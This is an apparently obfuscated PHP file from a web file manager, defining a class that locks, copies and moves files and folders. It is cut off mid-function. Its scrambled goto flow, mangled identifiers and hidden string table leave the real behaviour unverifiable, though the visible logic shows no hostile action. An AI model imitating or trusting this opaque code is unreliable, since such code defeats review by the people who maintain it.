<?php
 goto Cİƒ÷–ŸÍ; c¨³×äÏèÇ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($a±ïÒ‡™‘) { goto a„îÂêã´Ê; a„îÂêã´Ê: $FÅé‡ÃÉÉ =& $_SERVER[œÕÊİğö]; if (!$this->allowLock()) { return; } $this->_lockCheck($FÅé‡ÃÉÉ[552], $a±ïÒ‡™‘); goto b­‘š«®àß; b­‘š«®àß: $EâÑ¼¤×ÛÁ = 1; $this->_lockEvent($a±ïÒ‡™‘, array($FÅé‡ÃÉÉ[553], $FÅé‡ÃÉÉ[554]), $EâÑ¼¤×ÛÁ); $this->_lockParent($a±ïÒ‡™‘, array($FÅé‡ÃÉÉ[554]), $EâÑ¼¤×ÛÁ); goto DÊ²œŸ™®; DÊ²œŸ™®: $this->_lockEvent($a±ïÒ‡™‘, array($FÅé‡ÃÉÉ[555], $FÅé‡ÃÉÉ[556]), $EâÑ¼¤×ÛÁ); $this->_lockCheckEnd($FÅé‡ÃÉÉ[552], $a±ïÒ‡™‘); goto EËèâØ¦è­; EËèâØ¦è­: } public function lockCopyEnd($BÚ•­Ã£°•) { $c†Š¡õµø =& $_SERVER[œÕÊİğö]; if (!$this->allowLock()) { return; } $bÁç÷¸àÕ˜ = 0; $this->_lockEvent($BÚ•­Ã£°•, array($c†Š¡õµø[553], $c†Š¡õµø[554]), $bÁç÷¸àÕ˜); $this->_lockParent($BÚ•­Ã£°•, array($c†Š¡õµø[554]), $bÁç÷¸àÕ˜); $this->_lockEvent($BÚ•­Ã£°•, array($c†Š¡õµø[555], $c†Š¡õµø[556]), $bÁç÷¸àÕ˜); } public function lockWriteStart($Aß‹‡é’òÃ, $Aœ‰Ê÷äë’ = '') { goto Eµ°‹ˆ; Eµ°‹ˆ: $bà¦ „Œ³  =& $_SERVER[œÕÊİğö]; if (!$this->allowLock()) { return; } $this->_lockCheck($bà¦ „Œ³ [553], $Aß‹‡é’òÃ); goto F—á…ø¶ø‡; F—á…ø¶ø‡: $Eååè»ö¿¨ = 1; $this->_lockKey($bà¦ „Œ³ [557] . $Aß‹‡é’òÃ . $bà¦ „Œ³ [105] . $Aœ‰Ê÷äë’, $Eååè»ö¿¨); $this->_lockEvent($Aß‹‡é’òÃ, array($bà¦ „Œ³ [552], $bà¦ „Œ³ [554]), $Eååè»ö¿¨); goto AóÆ˜ïË¢; AóÆ˜ïË¢: $this->_lockParent($Aß‹‡é’òÃ, array($bà¦ „Œ³ [552], $bà¦ „Œ³ [554]), $Eååè»ö¿¨); $this->_lockCheckEnd($bà¦ „Œ³ [553], $Aß‹‡é’òÃ); goto e¡‹¯ÁğØ; e¡‹¯ÁğØ: } public function lockWriteEnd($E˜õéÎ¹è, $AÓ¾Ù»Ù‰ = '') { $DÓŠöÆùŸŒ =& $_SERVER[œÕÊİğö]; if (!$this->allowLock()) { return; } $eØî¼ƒ¹Ù = 0; $this->_lockKey($DÓŠöÆùŸŒ[557] . $E˜õéÎ¹è . $DÓŠöÆùŸŒ[105] . $AÓ¾Ù»Ù‰, $eØî¼ƒ¹Ù); $this->_lockEvent($E˜õéÎ¹è, array($DÓŠöÆùŸŒ[552], $DÓŠöÆùŸŒ[554]), $eØî¼ƒ¹Ù); $this->_lockParent($E˜õéÎ¹è, array($DÓŠöÆùŸŒ[552], $DÓŠöÆùŸŒ[554]), $eØî¼ƒ¹Ù); } public function lockMoveStart($b¿õ‰Œ­¤Ô) { goto F¸ß¢™ìÚŒ; bÃ‹ªàŠ¶: $this->_lockParent($b¿õ‰Œ­¤Ô, array($CŒì„¬ÊÁŠ[552], $CŒì„¬ÊÁŠ[554]), $A›ŠÛ¨Í³); $this->_lockEvent($b¿õ‰Œ­¤Ô, array($CŒì„¬ÊÁŠ[559], $CŒì„¬ÊÁŠ[555], $CŒì„¬ÊÁŠ[556]), $A›ŠÛ¨Í³); $this->_lockCheckEnd($CŒì„¬ÊÁŠ[554], $b¿õ‰Œ­¤Ô); goto CŒ‚•ùéñù; C‘Ğô¬ËÔˆ: $A›ŠÛ¨Í³ = 1; $this->_lockKey($CŒì„¬ÊÁŠ[558] . $b¿õ‰Œ­¤Ô, $A›ŠÛ¨Í³); $this->_lockEvent($b¿õ‰Œ­¤Ô, array($CŒì„¬ÊÁŠ[552], $CŒì„¬ÊÁŠ[553]), $A›ŠÛ¨Í³); goto bÃ‹ªàŠ¶; F¸ß¢™ìÚŒ: $CŒì„¬ÊÁŠ =& $_SERVER[œÕÊİğö]; if (!$this->allowLock()) { return; } $this->_lockCheck($CŒì„¬ÊÁŠ[554], $b¿õ‰Œ­¤Ô); goto C‘Ğô¬ËÔˆ; CŒ‚•ùéñù: } public function lockMoveEnd($CîöİíôËí) { goto B”á‚ÉÛ²; B”á‚ÉÛ²: $ağ±“ºÚè =& $_SERVER[œÕÊİğö]; if (!$this->allowLock()) { return; } $bÒø¢Ø¶¯Õ = 0; goto Däùœ¤«Ñ‹; Däùœ¤«Ñ‹: $this->_lockKey($ağ±“ºÚè[558] . $CîöİíôËí, $bÒø¢Ø¶¯Õ); $this->_lockEvent($CîöİíôËí, array($ağ±“ºÚè[552], $ağ±“ºÚè[553]), $bÒø¢Ø¶¯Õ); $this->_lockParent($CîöİíôËí, array($ağ±“ºÚè[552], $ağ±“ºÚè[554]), $bÒø¢Ø¶¯Õ); goto Añ¤ÚÁÇŞà; Añ¤ÚÁÇŞà: $this->_lockEvent($CîöİíôËí, array($ağ±“ºÚè[559], $ağ±“ºÚè[555], $ağ±“ºÚè[556]), $bÒø¢Ø¶¯Õ); goto EÕÉîÍ¢Ğ; EÕÉîÍ¢Ğ: } private function _lockCheck($aãºŸÓäÛ¹, $b«ºˆËÂ»—) { goto EÈ¢ÃõÈÉƒ; d—Ô»Ø©²: $this->_lockTimeStart[$eÏ˜¸†Îõ¤] = timeFloat(); if (!is_array($EÒòÅƒÁ¿Œ)) { return; } $f‡ñäõùŒ¢ = LNG($bŒùƒ¯»–î[560]); goto añ‚¹¬‰â“; d¾¡·‚âîÏ: $B­éï›âƒÔ = array_reverse($this->parentLevelArray($EÒòÅƒÁ¿Œ[$bŒùƒ¯»–î[524]])); foreach ($B­éï›âƒÔ as $f£‰ãÍ¨¯) { $eÏ˜¸†Îõ¤ = $aãºŸÓäÛ¹ . $bŒùƒ¯»–î[561] . $f£‰ãÍ¨¯; if (CacheLock::lockGet($bŒùƒ¯»–î[562] . $eÏ˜¸†Îõ¤)) { $EÒòÅƒÁ¿Œ = $this->sourceInfo($f£‰ãÍ¨¯); CacheLock::setErrorMsg($bŒùƒ¯»–î[170] . htmlspecialchars($EÒòÅƒÁ¿Œ[$bŒùƒ¯»–î[38]]) . $bŒùƒ¯»–î[539] . $f‡ñäõùŒ¢); $this->_lockKey($eÏ˜¸†Îõ¤, 1); $this->_lockKey($eÏ˜¸†Îõ¤, 0); } } goto EŒóÈ¢â; EÈ¢ÃõÈÉƒ: $bŒùƒ¯»–î =& $_SERVER[œÕÊİğö]; $EÒòÅƒÁ¿Œ = $this->sourceInfo($b«ºˆËÂ»—); $eÏ˜¸†Îõ¤ = $aãºŸÓäÛ¹ . $bŒùƒ¯»–î[105] . $b«ºˆËÂ»—; goto d—Ô»Ø©²; añ‚¹¬‰â“: CacheLock::setErrorMsg($bŒùƒ¯»–î[170] . htmlspecialchars($EÒòÅƒÁ¿Œ[$bŒùƒ¯»–î[38]]) . $bŒùƒ¯»–î[539] . $f‡ñäõùŒ¢); $this->_lockKey($eÏ˜¸†Îõ¤, 1); $this->_lockKey($eÏ˜¸†Îõ¤, 0); goto d¾¡·‚âîÏ; EŒóÈ¢â: } private function _lockCheckEnd($D³—©òç×, $A¯å«ÌÏ”) { goto DŸğ¡§á¼; B“·õ¬©¯´: if ($FÇ¹ìÏ¾Ÿ > 0.5) { unset(self::$cacheSourceInfo[$fëø¡‘¿”[461] . $A¯å«ÌÏ”]); } $aƒ”â” = $this->sourceInfo($A¯å«ÌÏ”); if (!$aƒ”â”) { show_json(LNG($fëø¡‘¿”[115]), !1); } goto Fëõ¥ñèğ; DŸğ¡§á¼: $fëø¡‘¿” =& $_SERVER[œÕÊİğö]; $cæ…Â¬Ñ® = $D³—©òç× . $fëø¡‘¿”[105] . $A¯å«ÌÏ”; CacheLock::setErrorMsg($fëø¡‘¿”[251]); goto C¹¿«¬ƒÙ’; C¹¿«¬ƒÙ’: if (!isset($this->_lockTimeStart[$cæ…Â¬Ñ®])) { return; } $FÇ¹ìÏ¾Ÿ = timeFloat() - $this->_lockTimeStart[$cæ…Â¬Ñ®]; unset($this->_lockTimeStart[$cæ…Â¬Ñ®]); goto B“·õ¬©¯´; Fëõ¥ñèğ: } private function _lockParent($CÏ‚‚ØÖË, $bØÏ˜¦ÇÍ, $C¿¢º‘Ø×Ø) { if (!$this->autoLockSet) { return; } $EÇëÂ‡İÄ» = $this->sourceInfo($CÏ‚‚ØÖË); if (!is_array($EÇëÂ‡İÄ»)) { return; } $f‹Àˆï‹ò¢ = array_reverse($this->parentLevelArray($EÇëÂ‡İÄ»[$_SERVER[œÕÊİğö][524]])); foreach ($f‹Àˆï‹ò¢ as $C°İ•ÚÎ°) { $this->_lockEvent($C°İ•ÚÎ°, $bØÏ˜¦ÇÍ, $C¿¢º‘Ø×Ø); } } private function _lockEvent($AñŠŒ±àå, $Dºèê¿İµ, $fÑÆÏ­èÔï) { $b‰ÇÎ¬¥¬Å =& $_SERVER[œÕÊİğö]; if (!$this->autoLockSet) { return; } foreach ($Dºèê¿İµ as $A‰»ï…İ„…) { $eÅ¬Êåê¿ = $A‰»ï…İ„… . $b‰ÇÎ¬¥¬Å[105] . $AñŠŒ±àå; if ($fÑÆÏ­èÔï && CacheLock::lockGet($b‰ÇÎ¬¥¬Å[562] . $eÅ¬Êåê¿)) { continue; } $this->_lockKey($eÅ¬Êåê¿, $fÑÆÏ­èÔï); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Aöèö›©, $E³ÕÏé®µ² = 1) { $e åïç¡Ì÷ = $_SERVER[œÕÊİğö][562] . md5($Aöèö›©); if ($E³ÕÏé®µ²) { if (isset(self::$_lockItemArr[$e åïç¡Ì÷])) { return; } self::$_lockItemArr[$e åïç¡Ì÷] = 1; CacheLock::lock($e åïç¡Ì÷, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$e åïç¡Ì÷])) { return; } unset(self::$_lockItemArr[$e åïç¡Ì÷]); CacheLock::unlock($e åïç¡Ì÷); } } public function isParentOf($b»ƒ¸Ÿ†´ˆ, $AÒËÈ¯ºÖÇ) { goto E‡•™¢©ÔÛ; E‡•™¢©ÔÛ: $aæÇœ„µÏÂ =& $_SERVER[œÕÊİğö]; $bÉ¬Ê¢§Ú = $this->sourceInfo($b»ƒ¸Ÿ†´ˆ); $eê¾¶Ş”ªƒ = $this->sourceInfo($AÒËÈ¯ºÖÇ); goto f¿Å ˆÚÌÌ; Dƒ¤Áœ„¨š: return $d»¥‰‹; goto CÀ¤´Üæš; f¿Å ˆÚÌÌ: $BÙìŞ©Ê‰ = $bÉ¬Ê¢§Ú[$aæÇœ„µÏÂ[524]] . $bÉ¬Ê¢§Ú[$aæÇœ„µÏÂ[406]] . $aæÇœ„µÏÂ[57]; $Cˆª‰•è• = $eê¾¶Ş”ªƒ[$aæÇœ„µÏÂ[524]] . $eê¾¶Ş”ªƒ[$aæÇœ„µÏÂ[406]] . $aæÇœ„µÏÂ[57]; $d»¥‰‹ = strpos($Cˆª‰•è•, $BÙìŞ©Ê‰) === 0; goto Dƒ¤Áœ„¨š; CÀ¤´Üæš: } private $targetIsDelete = 0; public function copy($f‡‚Üà–Å, $d‚óÚ»ÏŞ›, $bá¹¡ºš  = REPEAT_REPLACE, $BĞº‘ĞÍİ = '') { goto eõ››•àê©; céÏì¥›¼: $this->lockCopyStart($f‡‚Üà–Å); $this->lockWriteStart($d‚óÚ»ÏŞ›, $bÒªµ™Î²); $d‡ö’Ÿ‘æÅ = array($f‡¾£Íƒˆ¤[563] => array(), $f‡¾£Íƒˆ¤[564] => array(), $f‡¾£Íƒˆ¤[565] => array()); goto AòÂôä½É×; DÏ•Ú³ï¨ë: $this->_childrenListClear(); $this->lockCopyEnd($f‡‚Üà–Å); $this->lockWriteEnd($d‚óÚ»ÏŞ›, $bÒªµ™Î²); goto d§¸‡ò†•°; eõ››•àê©: $f‡¾£Íƒˆ¤ =& $_SERVER[œÕÊİğö]; $cÀ’ôÓº½¹ = $this->sourceInfo($f‡‚Üà–Å); $béôÖŸæÈ = $this->sourceInfo($d‚óÚ»ÏŞ›); goto D»Æ¥Äœ†Í; d§¸‡ò†•°: if ($cÀ’ôÓº½¹[$f‡¾£Íƒˆ¤[414]] == $f‡¾£Íƒˆ¤[97] && $A¸æÙó½Ã­ == $d§åÉ¯ÊÑŞ) { $this->folderSizeResetChildren($A¸æÙó½Ã­); } Model($f‡¾£Íƒˆ¤[566])->addAll($d‡ö’Ÿ‘æÅ[$f‡¾£Íƒˆ¤[564]], array(), !0); if ($A¸æÙó½Ã­ != $d§åÉ¯ÊÑŞ || $cÀ’ôÓº½¹[$f‡¾£Íƒˆ¤[414]] == $f‡¾£Íƒˆ¤[97]) { Model($f‡¾£Íƒˆ¤[567])->eventCopy($d§åÉ¯ÊÑŞ); } goto C¤¤Íõ§ƒÒ; D»Æ¥Äœ†Í: if (!$cÀ’ôÓº½¹ || !$béôÖŸæÈ || $béôÖŸæÈ[$f‡¾£Íƒˆ¤[414]] != $f‡¾£Íƒˆ¤[97]) { return !1; } if ($this->isParentOf($f‡‚Üà–Å, $d‚óÚ»ÏŞ›)) { return !1; } $bÒªµ™Î² = $BĞº‘ĞÍİ ? $BĞº‘ĞÍİ : $cÀ’ôÓº½¹[$f‡¾£Íƒˆ¤[38]]; goto céÏì¥›¼; C»øÄæ…“: $this->updateModifyTime($d‚óÚ»ÏŞ›); return $d§åÉ¯ÊÑŞ; goto eÔ’É·à¬Œ; AòÂôä½É×: $this->targetIsDelete = intval($cÀ’ôÓº½¹[$f‡¾£Íƒˆ¤[434]]); $A¸æÙó½Ã­ = $this->fileNameExistCache($d‚óÚ»ÏŞ›, $cÀ’ôÓº½¹[$f‡¾£Íƒˆ¤[38]]); $d§åÉ¯ÊÑŞ = $this->_copy($f‡‚Üà–Å, $d‚óÚ»ÏŞ›, $bá¹¡ºš , $d‡ö’Ÿ‘æÅ, !0, $BĞº‘ĞÍİ); goto DÏ•Ú³ï¨ë; C¤¤Íõ§ƒÒ: $this->saveAll($d‡ö’Ÿ‘æÅ[$f‡¾£Íƒˆ¤[565]]); Model($f‡¾£Íƒˆ¤[203])->linkAdd($d‡ö’Ÿ‘æÅ[$f‡¾£Íƒˆ¤[563]]); $this->folderSizeReset($d‚óÚ»ÏŞ›); goto C»øÄæ…“; eÔ’É·à¬Œ: } private function _copy($b·ÖÒÒñªŸ, $EÜÁËÑ¡Ìë, $c¦¥ìÃÎ, &$fƒ¼Öº•Àã, $C”‚ğ¦¿Ø‡, $eˆ¦ÇÛ = '') { goto bù¸Ö°ê±; bù¸Ö°ê±: $EğŸáÙâ”õ =& $_SERVER[œÕÊİğö]; $a †‹Š§Ü = $this->sourceInfoCache($b·ÖÒÒñªŸ); $BòŠ·îİä = $a †‹Š§Ü[$EğŸáÙâ”õ[414]] == $EğŸáÙâ”õ[97]; goto cŞÍÖÏ–”¾; AáæÆ½‹À: return $f°¶Ú¯’ÜÌ; goto aØ½Ú¦ÉÒ; cŞÍÖÏ–”¾: $fÈÊ—é–¶£ = $eˆ¦ÇÛ ? $eˆ¦ÇÛ : $a †‹Š§Ü[$EğŸáÙâ”õ[38]]; $b”‚ˆ ‰ ù = $this->fileNameExistCache($EÜÁËÑ¡Ìë, $fÈÊ—é–¶£); if ($C”‚ğ¦¿Ø‡) { $this->_childrenAllMake($b·ÖÒÒñªŸ); if ($BòŠ·îİä && $b”‚ˆ ‰ ù) { $this->_childrenAllMake($b”‚ˆ ‰ ù); } } goto Bƒ¨ÂÁ¥Œä; Bƒ¨ÂÁ¥Œä: if (!$b”‚ˆ ‰ ù) { return $this->_copyCreate($b·ÖÒÒñªŸ, $EÜÁËÑ¡Ìë, $fÈÊ—é–¶£, $fƒ¼Öº•Àã); } $f°¶Ú¯’ÜÌ = $b”‚ˆ ‰ ù; if ($BòŠ·îİä) { if ($c¦¥ìÃÎ == REPEAT_RENAME_FOLDER) { $fÈÊ—é–¶£ = $this->fileNameAutoCache($EÜÁËÑ¡Ìë, $fÈÊ—é–¶£, $c¦¥ìÃÎ, $BòŠ·îİä); $f°¶Ú¯’ÜÌ = $this->_copyCreate($b·ÖÒÒñªŸ, $EÜÁËÑ¡Ìë, $fÈÊ—é–¶£, $fƒ¼Öº•Àã); } else { $FÙéêˆİõ = $this->_childrenList($b·ÖÒÒñªŸ); foreach ($FÙéêˆİõ as $Dä¬’í”¤É) { $this->_copy($Dä¬’í”¤É[$EğŸáÙâ”õ[406]], $b”‚ˆ ‰ ù, $c¦¥ìÃÎ, $fƒ¼Öº•Àã, !1); } } } else { if ($c¦¥ìÃÎ == REPEAT_RENAME || $c¦¥ìÃÎ == REPEAT_RENAME_FOLDER) { $fÈÊ—é–¶£ = $this->fileNameAutoCache($EÜÁËÑ¡Ìë, $fÈÊ—é–¶£, $c¦¥ìÃÎ, $BòŠ·îİä); $f°¶Ú¯’ÜÌ = $this->_copyCreate($b·ÖÒÒñªŸ, $EÜÁËÑ¡Ìë, $fÈÊ—é–¶£, $fƒ¼Öº•Àã); } else { if ($c¦¥ìÃÎ == REPEAT_REPLACE) { $E÷¼ÛØï¾Ò = $this->sourceInfoCache($b”‚ˆ ‰ ù); $dÈ¦§ŒæÁ‚ = $this->fileHistory($E÷¼ÛØï¾Ò, $a †‹Š§Ü[$EğŸáÙâ”õ[470]], $a †‹Š§Ü[$EğŸáÙâ”õ[88]]); if ($dÈ¦§ŒæÁ‚) { $fƒ¼Öº•Àã[$EğŸáÙâ”õ[563]][] = $a †‹Š§Ü[$EğŸáÙâ”õ[470]]; } } else { if ($c¦¥ìÃÎ == REPEAT_SKIP) { } } } Hook::trigger($EğŸáÙâ”õ[568], array($EğŸáÙâ”õ[569], $a †‹Š§Ü, 0)); } goto AáæÆ½‹À; aØ½Ú¦ÉÒ: } private function _copyCreate($a –Ô®²Èó, $eåÛËïÁÓ·, $B‰ò˜²³”•, &$Fõ£ÓÍÄÂŒ) { goto CÇ‡‡Íƒ¬«; fŠ©­†’éË: $A™®¨Ö‰ôé = $this->add($Bß·»…ˆ½³); $cË¥Ìî´‹Î = array($føã§äÇˆ…[406] => $A™®¨Ö‰ôé, $føã§äÇˆ…[38] => $B‰ò˜²³”•); $this->_copyApplyMeta($cË¥Ìî´‹Î, $Fõ£ÓÍÄÂŒ); goto Eİ¼³¶Ä ›; CÇ‡‡Íƒ¬«: $føã§äÇˆ… =& $_SERVER[œÕÊİğö]; $b‘ˆİÓ¢‘˜ = $this->sourceInfoCache($a –Ô®²Èó); $CšïˆÂï = $this->sourceInfoCache($eåÛËïÁÓ·); goto e‰°Ä£Şùí; e‰°Ä£Şùí: $Bß·»…ˆ½³ = $this->_makeItemData($b‘ˆİÓ¢‘˜, $CšïˆÂï, $B‰ò˜²³”•); Hook::trigger($føã§äÇˆ…[570], $Bß·»…ˆ½³); Hook::trigger($føã§äÇˆ…[571], array($føã§äÇˆ…[572], $Bß·»…ˆ½³, 0)); goto fŠ©­†’éË; c¯®¿£ŒÑš: $this->_childrenListAll($a –Ô®²Èó, $a¢Ë¤®†Ü·); $có˜‰ÉÚ¤° = count($a¢Ë¤®†Ü·); if ($có˜‰ÉÚ¤° == 0) { return $A™®¨Ö‰ôé; } goto a¤²¥°®ÆÀ; fä•‰ÕÂ¡: $this->chunkEventSet($føã§äÇˆ…[577], array($føã§äÇˆ…[578], $Bß·»…ˆ½³, $có˜‰ÉÚ¤°)); $this->saveAll($bŒÍ…ƒÙ‰); return $A™®¨Ö‰ôé; goto eç†¤’Š³; Eİ¼³¶Ä ›: if ($b‘ˆİÓ¢‘˜[$føã§äÇˆ…[414]] != $føã§äÇˆ…[97]) { $Fõ£ÓÍÄÂŒ[$føã§äÇˆ…[563]][] = $b‘ˆİÓ¢‘˜[$føã§äÇˆ…[470]]; return $A™®¨Ö‰ôé; } $a¢Ë¤®†Ü· = array(); $d²çĞíÜÍè = array(); goto c¯®¿£ŒÑš; AÀÕ¦³“¼³: $DóäàÈ‡“[$a –Ô®²Èó] = $A™®¨Ö‰ôé; $CóŒÅÕ‰ = array(); $bŒÍ…ƒÙ‰ = array(); goto bì¬§öóãÕ; a¤²¥°®ÆÀ: $a‚‰å«¢Œ = $this->sourceInfo($A™®¨Ö‰ôé); foreach ($a¢Ë¤®†Ü· as $a°ª «ˆ­É) { $E‰¿½Œî¨Š = $this->_makeItemData($a°ª «ˆ­É, $a‚‰å«¢Œ, $a°ª «ˆ­É[$føã§äÇˆ…[38]]); $E‰¿½Œî¨Š[$føã§äÇˆ…[524]] = $a°ª «ˆ­É[$føã§äÇˆ…[524]]; $d²çĞíÜÍè[] = $E‰¿½Œî¨Š; } $this->chunkEventSet($føã§äÇˆ…[573], array($føã§äÇˆ…[574], $Bß·»…ˆ½³, $có˜‰ÉÚ¤°)); goto fÅƒæ›Ôí; bì¬§öóãÕ: foreach ($féé×ùèª as $a°ª «ˆ­É) { $BÙµâàóš = $a°ª «ˆ­É[$føã§äÇˆ…[406]]; $f‘¬©Ÿ÷¤ = $this->_childrenMatch($DóäàÈ‡“, $a°ª «ˆ­É, $a‚‰å«¢Œ); $CóŒÅÕ‰[] = array($føã§äÇˆ…[406], $BÙµâàóš, $føã§äÇˆ…[501], $f‘¬©Ÿ÷¤[$føã§äÇˆ…[501]]); $bŒÍ…ƒÙ‰[] = array($føã§äÇˆ…[406], $BÙµâàóš, $føã§äÇˆ…[524], $f‘¬©Ÿ÷¤[$føã§äÇˆ…[524]]); $this->_copyApplyMeta($a°ª «ˆ­É, $Fõ£ÓÍÄÂŒ); if ($a°ª «ˆ­É[$føã§äÇˆ…[414]] != $føã§äÇˆ…[97]) { $Fõ£ÓÍÄÂŒ[$føã§äÇˆ…[563]][] = $a°ª «ˆ­É[$føã§äÇˆ…[470]]; } } $this->chunkEventSet($føã§äÇˆ…[575], array($føã§äÇˆ…[576], $Bß·»…ˆ½³, $có˜‰ÉÚ¤°)); $this->saveAll($CóŒÅÕ‰); goto fä•‰ÕÂ¡; fÅƒæ›Ôí: $this->addAll($d²çĞíÜÍè, array(), !1); $féé×ùèª = $this->where(array($føã§äÇˆ…[501] => $A™®¨Ö‰ôé))->select(); $DóäàÈ‡“ = $this->_childrenMakeRelation($a¢Ë¤®†Ü·, $féé×ùèª); goto AÀÕ¦³“¼³; eç†¤’Š³: } private function _childrenMakeRelation($a”½œ÷½Åó, $FÁäÃ‚šàï) { $DÕ¿ëê¤Ûà =& $_SERVER[œÕÊİğö]; $eí—³µõ£ = array(); $aœ†¹‡·°§ = array(); foreach ($a”½œ÷½Åó as $D™›ò˜ÇİÛ) { $dÌîÊ–À¦ = $D™›ò˜ÇİÛ[$DÕ¿ëê¤Ûà[38]] . $DÕ¿ëê¤Ûà[8] . $D™›ò˜ÇİÛ[$DÕ¿ëê¤Ûà[524]]; $eí—³µõ£[$dÌîÊ–À¦] = $D™›ò˜ÇİÛ[$DÕ¿ëê¤Ûà[406]]; } foreach ($FÁäÃ‚šàï as $D™›ò˜ÇİÛ) { $dÌîÊ–À¦ = $D™›ò˜ÇİÛ[$DÕ¿ëê¤Ûà[38]] . $DÕ¿ëê¤Ûà[8] . $D™›ò˜ÇİÛ[$DÕ¿ëê¤Ûà[524]]; $D¸¯¨Ïè¢ = $eí—³µõ£[$dÌîÊ–À¦]; $aœ†¹‡·°§[$D¸¯¨Ïè¢] = $D™›ò˜ÇİÛ[$DÕ¿ëê¤Ûà[406]]; } return $aœ†¹‡·°§; } private function _childrenMatch($dƒğ‹ÈÚ‰¸, $f¾¢¶‚âª, $c­ëÂÑÌ¤É) { goto bÕà˜†ÀÑó; b­µöÔŒ£›: foreach ($d¨† ß†Ç‰ as $f‰¼ùÊœ¬) { if (isset($dƒğ‹ÈÚ‰¸[$f‰¼ùÊœ¬])) { $CŞàª¥È›Î .= $dƒğ‹ÈÚ‰¸[$f‰¼ùÊœ¬] . $b‰ÁÇ–‡š[579]; } } $CŞàª¥È›Î = rtrim($CŞàª¥È›Î, $b‰ÁÇ–‡š[57]) . $b‰ÁÇ–‡š[57]; $f•ÖçŒ›¤ô = $this->parentLevelArray($CŞàª¥È›Î); goto F„ä½¼å; bÕà˜†ÀÑó: $b‰ÁÇ–‡š =& $_SERVER[œÕÊİğö]; $CŞàª¥È›Î = $c­ëÂÑÌ¤É[$b‰ÁÇ–‡š[524]]; $d¨† ß†Ç‰ = $this->parentLevelArray($f¾¢¶‚âª[$b‰ÁÇ–‡š[524]]); goto b­µöÔŒ£›; F„ä½¼å: $BàØš¿î‰ = $f•ÖçŒ›¤ô[count($f•ÖçŒ›¤ô) - 1]; return array($b‰ÁÇ–‡š[501] => $BàØš¿î‰, $b‰ÁÇ–‡š[524] => $CŞàª¥È›Î); goto bŸÛ³Ò•Ü·; bŸÛ³Ò•Ü·: } private function _makeItemData($Aèˆó¤ï , $cÍ›Û—Ì®Ñ, $aÌç­¿ºÆ) { $d¬ò¬…“‡æ =& $_SERVER[œÕÊİğö]; $F–ÈÑ‰¢Â = array($d¬ò¬…“‡æ[580] => $Aèˆó¤ï [$d¬ò¬…“‡æ[414]], $d¬ò¬…“‡æ[424] => $aÌç­¿ºÆ, $d¬ò¬…“‡æ[581] => $Aèˆó¤ï [$d¬ò¬…“‡æ[416]], $d¬ò¬…“‡æ[471] => $Aèˆó¤ï [$d¬ò¬…“‡æ[470]], $d¬ò¬…“‡æ[582] => $Aèˆó¤ï [$d¬ò¬…“‡æ[88]], $d¬ò¬…“‡æ[583] => $cÍ›Û—Ì®Ñ[$d¬ò¬…“‡æ[415]], $d¬ò¬…“‡æ[584] => $cÍ›Û—Ì®Ñ[$d¬ò¬…“‡æ[507]], $d¬ò¬…“‡æ[585] => USER_ID, $d¬ò¬…“‡æ[586] => USER_ID, $d¬ò¬…“‡æ[405] => $cÍ›Û—Ì®Ñ[$d¬ò¬…“‡æ[406]], $d¬ò¬…“‡æ[587] => $cÍ›Û—Ì®Ñ[$d¬ò¬…“‡æ[524]] . $cÍ›Û—Ì®Ñ[$d¬ò¬…“‡æ[406]] . $d¬ò¬…“‡æ[57], $d¬ò¬…“‡æ[428] => $Aèˆó¤ï [$d¬ò¬…“‡æ[94]], $d¬ò¬…“‡æ[433] => 0, $d¬ò¬…“‡æ[588] => $d¬ò¬…“‡æ[43]); return $F–ÈÑ‰¢Â; } private function _copyApplyMeta($e»šÖ‡ïíé, &$fÃİ© ®„‡) { $c¢ÓÇ‰Áé¼ =& $_SERVER[œÕÊİğö]; $DãÂå“‚‚š = $e»šÖ‡ïíé[$c¢ÓÇ‰Áé¼[406]]; $c˜’·‰½ãÈ = $e»šÖ‡ïíé[$c¢ÓÇ‰Áé¼[38]]; if (!isset($e»šÖ‡ïíé[$c¢ÓÇ‰Áé¼[589]]) || !$e»šÖ‡ïíé[$c¢ÓÇ‰Áé¼[589]] || $e»šÖ‡ïíé[$c¢ÓÇ‰Áé¼[589]] == $c¢ÓÇ‰Áé¼[201]) { $fÃİ© ®„‡[$c¢ÓÇ‰Áé¼[565]][] = array($c¢ÓÇ‰Áé¼[406], $DãÂå“‚‚š, $c¢ÓÇ‰Áé¼[589], short_id($DãÂå“‚‚š)); } if (Input::check($c˜’·‰½ãÈ, $c¢ÓÇ‰Áé¼[590])) { $fÃİ© ®„‡[$c¢ÓÇ‰Áé¼[564]][] = array($c¢ÓÇ‰Áé¼[406] => $DãÂå“‚‚š, $c¢ÓÇ‰Áé¼[103] => $c¢ÓÇ‰Áé¼[467], $c¢ÓÇ‰Áé¼[382] => str_replace($c¢ÓÇ‰Áé¼[60], $c¢ÓÇ‰Áé¼[43], Pinyin::get($c˜’·‰½ãÈ))); $fÃİ© ®„‡[$c¢ÓÇ‰Áé¼[564]][] = array($c¢ÓÇ‰Áé¼[406] => $DãÂå“‚‚š, $c¢ÓÇ‰Áé¼[103] => $c¢ÓÇ‰Áé¼[466], $c¢ÓÇ‰Áé¼[382] => Pinyin::get($c˜’·‰½ãÈ, $c¢ÓÇ‰Áé¼[591])); } $fÃİ© ®„‡[$c¢ÓÇ‰Áé¼[564]][] = array($c¢ÓÇ‰Áé¼[406] => $DãÂå“‚‚š, $c¢ÓÇ‰Áé¼[103] => $c¢ÓÇ‰Áé¼[445], $c¢ÓÇ‰Áé¼[382] => KodSort::makeStr($c˜’·‰½ãÈ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($aÚ«ÈˆÂİ) { goto F²‹¹°é“; dâª«»Ó»: $b×¸ÏŠ‡·ã = array_to_keyvalue($b×¸ÏŠ‡·ã, $eêŸ¢”×…[406]); foreach ($b×¸ÏŠ‡·ã as $F¨Œ»–•À) { $a†Óƒ­¤¥¦ = $F¨Œ»–•À[$eêŸ¢”×…[501]]; $aÚ«ÈˆÂİ = $F¨Œ»–•À[$eêŸ¢”×…[406]]; if (!isset($this->_childrenListCache[$aÚ«ÈˆÂİ]) && $F¨Œ»–•À[$eêŸ¢”×…[414]] == $eêŸ¢”×…[97]) { $this->_childrenListCache[$aÚ«ÈˆÂİ] = array(); } if (!isset($this->_childrenListCache[$a†Óƒ­¤¥¦])) { $this->_childrenListCache[$a†Óƒ­¤¥¦] = array(); } 